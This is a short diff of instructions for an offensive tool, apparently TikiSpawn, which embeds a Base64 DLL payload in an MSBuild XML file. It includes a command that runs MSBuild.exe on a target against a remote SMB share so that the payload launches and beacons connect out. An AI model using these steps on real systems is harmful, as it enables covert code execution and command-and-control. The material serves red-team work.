@@ -24,3 +24,4 @@ Add Base64 to the following TikiSpawn.xml File at (public const string Dll = "TV
 Option: You can either host file over SMB or copy the XML to the target to execute
 
 On the target run C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\share\TikiSpawn.xml
+  There may be errors when executing MSBuild but the beacons may still work
